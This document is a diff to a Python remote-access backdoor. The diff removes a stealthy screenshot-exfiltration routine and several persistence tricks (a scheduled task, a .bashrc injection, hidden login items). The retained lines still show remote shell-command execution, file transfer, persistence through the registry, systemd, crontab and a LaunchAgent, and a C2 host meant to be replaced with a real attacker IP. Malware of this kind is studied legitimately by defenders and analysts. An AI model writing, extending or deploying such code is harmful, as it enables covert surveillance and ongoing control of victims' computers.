@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import socket
 import subprocess
 import os
@@ -8,8 +7,8 @@ import platform
 import random
 import threading
 import shutil
-import glob
 from datetime import datetime
+
 
 class Backdoor:
     def __init__(self, host="127.0.0.1", port=4444):
@@ -76,8 +75,6 @@ Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
                     response = self._receive_file(command[7:])
                 elif command == "persist":
                     response = self._setup_persistence()
-                elif command == "screenshot" or command == "grab_screen":
-                    response = self._take_screenshot()
                 else:
                     # Execute shell command
                     response = self._execute_command(command)
@@ -152,78 +149,6 @@ Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
             return f"File saved to {file_path}"
         except Exception as e:
             return f"Error receiving file: {str(e)}"
-
-    def _take_screenshot(self):
-        """Take a screenshot and send it to the server, then delete all traces"""
-        try:
-            # Check if we have the required modules
-            try:
-                from PIL import ImageGrab
-                import io
-            except ImportError:
-                return "Error: Required libraries not installed (PIL)"
-            
-            # Create a unique timestamp for the filename
-            timestamp = int(time.time())
-            
-            # Determine temp directory based on OS
-            if platform.system().lower() == "windows":
-                temp_dir = os.environ.get('TEMP', 'C:\\Windows\\Temp')
-            else:
-                temp_dir = '/tmp'
-                
-            # Create a unique filename
-            temp_path = os.path.join(temp_dir, f"scr_{timestamp}_{random.randint(1000, 9999)}.png")
-            
-            try:
-                # Take the screenshot
-                screenshot = ImageGrab.grab()
-                
-                # Save to memory first
-                img_bytes = io.BytesIO()
-                screenshot.save(img_bytes, format="PNG")
-                img_data = img_bytes.getvalue()
-                
-                # Save to temp file
-                with open(temp_path, "wb") as f:
-                    f.write(img_data)
-                
-                # Send the file
-                result = self._send_file(temp_path)
-                
-            finally:
-                # Clean up - make sure to delete the screenshot
-                try:
-                    # Delete the specific file
-                    if os.path.exists(temp_path):
-                        os.remove(temp_path)
-                        
-                    # Also search for any leftover screenshot files with similar patterns
-                    leftover_patterns = [
-                        os.path.join(temp_dir, "scr_*.png"),
-                        os.path.join(temp_dir, "screen_*.png")
-                    ]
-                    
-                    for pattern in leftover_patterns:
-                        for leftover_file in glob.glob(pattern):
-                            try:
-                                os.remove(leftover_file)
-                            except:
-                                pass
-                except:
-                    pass  # Silent failure for security
-                    
-            return result + "\n[+] Screenshot file securely deleted from victim system"
-            
-        except Exception as e:
-            # Try to clean up even on error
-            try:
-                if 'temp_path' in locals() and os.path.exists(temp_path):
-                    os.remove(temp_path)
-            except:
-                pass
-                
-            return f"Error taking screenshot: {str(e)}"
     
     def _setup_persistence(self):
         """Setup persistence based on the operating system"""
@@ -242,12 +167,7 @@ Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
                 # Add to registry
                 os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemService /t REG_SZ /d "{target_path}" /f')
                 
-                # Create scheduled task for elevated persistence
-                task_name = "SystemSecurityUpdate"
-                task_cmd = f'schtasks /create /tn {task_name} /sc onlogon /tr "{target_path}" /rl highest /f'
-                os.system(task_cmd)
-                
-                return "Persistence established via startup folder, registry, and scheduled task"
+                return "Persistence established via startup folder and registry"
                 
             elif system == "linux":
                 # Create a systemd service
@@ -278,12 +198,7 @@ WantedBy=multi-user.target
                 # Also add to crontab
                 os.system(f"(crontab -l 2>/dev/null; echo '@reboot python3 {executable_path}') | crontab -")
                 
-                # Add to .bashrc for user persistence
-                bashrc_path = os.path.expanduser("~/.bashrc")
-                with open(bashrc_path, "a") as f:
-                    f.write(f"\n# System Update Service\n(python3 {executable_path} &>/dev/null &)\n")
-                
-                return "Persistence established via systemd service, crontab, and .bashrc"
+                return "Persistence established via systemd service and crontab"
                 
             elif system == "darwin":  # macOS
                 plist_path = os.path.expanduser("~/Library/LaunchAgents/com.apple.system.plist")
@@ -316,13 +231,7 @@ WantedBy=multi-user.target
                 
                 os.system(f"launchctl load {plist_path}")
                 
-                # Also add to login items
-                login_item_cmd = f"""
-                osascript -e 'tell application "System Events" to make login item at end with properties {{path:"{executable_path}", hidden:true}}'
-                """
-                os.system(login_item_cmd)
-                
-                return "Persistence established via Launch Agent and Login Items"
+                return "Persistence established via Launch Agent"
             
             else:
                 return f"Persistence not implemented for {system}"
@@ -350,12 +259,8 @@ if __name__ == "__main__":
         except:
             pass
     
-    # Set up configuration - replace these with your actual C2 server details
-    C2_HOST = "127.0.0.1"  # The IP address of your control server
-    C2_PORT = 4444         # The port your server is listening on
-    
-    # Create and start backdoor
-    backdoor = Backdoor(host=C2_HOST, port=C2_PORT)
+    # Create and start backdoor (replace with actual C2 server IP)
+    backdoor = Backdoor(host="127.0.0.1", port=4444)
     
     # Start the connection in a separate thread
     connection_thread = threading.Thread(target=backdoor.connect)
@@ -368,4 +273,4 @@ if __name__ == "__main__":
             time.sleep(60)
     except KeyboardInterrupt:
         backdoor.disconnect()
-        sys.exit(0)
+        sys.exit(0) 
